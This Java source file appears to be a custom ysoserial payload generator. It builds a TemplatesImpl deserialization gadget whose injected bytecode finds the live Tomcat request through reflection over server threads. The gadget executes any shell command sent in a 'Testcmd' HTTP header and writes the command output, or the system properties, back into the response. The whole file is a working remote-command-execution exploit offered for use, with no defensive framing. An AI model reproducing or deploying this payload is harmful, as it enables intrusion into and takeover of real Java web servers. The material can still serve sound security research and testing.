package Test;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import ysoserial.payloads.util.Reflections;

import java.io.IOException;

public class TemplatesImplEcho {
    public static Object createTemplatesTomcatEcho() throws Exception {
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            return createTemplatesImplEcho(
                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImplEcho(TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }

    private static <T> T createTemplatesImplEcho(Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
        final T templates = (T) tplClass.newInstance();
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        CtClass ctClass = pool.makeClass("ysoserial.Pwner" + System.nanoTime());
        if (ctClass.getDeclaredConstructors().length != 0) {
            ctClass.removeConstructor(ctClass.getDeclaredConstructors()[0]);
        }
        ctClass.addMethod(CtMethod.make("private static void writeBody(Object resp, byte[] bs) throws Exception {\n" +
            "    Object o;\n" +
            "    Class clazz;\n" +
            "    try {\n" +
            "        clazz = Class.forName(\"org.apache.tomcat.util.buf.ByteChunk\");\n" +
            "        o = clazz.newInstance();\n" +
            "        clazz.getDeclaredMethod(\"setBytes\", new Class[]{byte[].class, int.class, int.class}).invoke(o," +
            " new Object[]{bs, new Integer(0), new Integer(bs.length)});\n" +
            "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{o});\n" +
            "    } catch (ClassNotFoundException e) {\n" +
            "        clazz = Class.forName(\"java.nio.ByteBuffer\");\n" +
            "        o = clazz.getDeclaredMethod(\"wrap\", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs})" +
            ";\n" +
            "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{o});\n" +
            "    } catch (NoSuchMethodException e) {\n" +
            "        clazz = Class.forName(\"java.nio.ByteBuffer\");\n" +
            "        o = clazz.getDeclaredMethod(\"wrap\", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs})" +
            ";\n" +
            "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{o});\n" +
            "    }\n" +
            "}", ctClass));
        ctClass.addMethod(CtMethod.make("private static Object getFV(Object o, String s) throws Exception {\n" +
            "    java.lang.reflect.Field f = null;\n" +
            "    Class clazz = o.getClass();\n" +
            "    while (clazz != Object.class) {\n" +
            "        try {\n" +
            "            f = clazz.getDeclaredField(s);\n" +
            "            break;\n" +
            "        } catch (NoSuchFieldException e) {\n" +
            "            clazz = clazz.getSuperclass();\n" +
            "        }\n" +
            "    }\n" +
            "    if (f == null) {\n" +
            "        throw new NoSuchFieldException(s);\n" +
            "    }\n" +
            "    f.setAccessible(true);\n" +
            "    return f.get(o);\n" +
            "}\n", ctClass));
        ctClass.addConstructor(CtNewConstructor.make("public TomcatEcho() throws Exception {\n" +
            "    Object o;\n" +
            "    Object resp;\n" +
            "    String s;\n" +
            "    boolean done = false;\n" +
            "    Thread[] ts = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), \"threads\");\n" +
            "    for (int i = 0; i < ts.length; i++) {\n" +
            "        Thread t = ts[i];\n" +
            "        if (t == null) {\n" +
            "            continue;\n" +
            "        }\n" +
            "        s = t.getName();\n" +
            "        if (!s.contains(\"exec\") && s.contains(\"http\")) {\n" +
            "            o = getFV(t, \"target\");\n" +
            "            if (!(o instanceof Runnable)) {\n" +
            "                continue;\n" +
            "            }\n" +
            "\n" +
            "            try {\n" +
            "                o = getFV(getFV(getFV(o, \"this$0\"), \"handler\"), \"global\");\n" +
            "            } catch (Exception e) {\n" +
            "                continue;\n" +
            "            }\n" +
            "\n" +
            "            java.util.List ps = (java.util.List) getFV(o, \"processors\");\n" +
            "            for (int j = 0; j < ps.size(); j++) {\n" +
            "                Object p = ps.get(j);\n" +
            "                o = getFV(p, \"req\");\n" +
            "                resp = o.getClass().getMethod(\"getResponse\", new Class[0]).invoke(o, new Object[0]);\n" +
            "                s = (String) o.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(o, " +
            "new Object[]{\"Testecho\"});\n" +
            "                if (s != null && !s.isEmpty()) {\n" +
            "                    resp.getClass().getMethod(\"setStatus\", new Class[]{int.class}).invoke(resp, new " +
            "Object[]{new Integer(200)});\n" +
            "                    resp.getClass().getMethod(\"addHeader\", new Class[]{String.class, String.class})" +
            ".invoke(resp, new Object[]{\"Testecho\", s});\n" +
            "                    done = true;\n" +
            "                }\n" +
            "                s = (String) o.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(o, " +
            "new Object[]{\"Testcmd\"});\n" +
            "                if (s != null && !s.isEmpty()) {\n" +
            "                    resp.getClass().getMethod(\"setStatus\", new Class[]{int.class}).invoke(resp, new " +
            "Object[]{new Integer(200)});\n" +
            "                    String[] cmd = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? " +
            "new String[]{\"cmd.exe\", \"/c\", s} : new String[]{\"/bin/sh\", \"-c\", s};\n" +
            "                    writeBody(resp, new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream" +
            "()).useDelimiter(\"\\\\A\").next().getBytes());\n" +
            "                    done = true;\n" +
            "                }\n" +
            "                if ((s == null || s.isEmpty()) && done) {\n" +
            "                    writeBody(resp, System.getProperties().toString().getBytes());\n" +
            "                }\n" +
            "\n" +
            "                if (done) {\n" +
            "                    break;\n" +
            "                }\n" +
            "            }\n" +
            "            if (done) {\n" +
            "                break;\n" +
            "            }\n" +
            "        }\n" +
            "    }\n" +
            "}", ctClass));

        CtClass superC = pool.get(abstTranslet.getName());
        ctClass.setSuperclass(superC);

        final byte[] classBytes = ctClass.toBytecode();
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
            classBytes,
//            classBytes, ClassFiles.classAsBytes(Foo.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;

    }


}
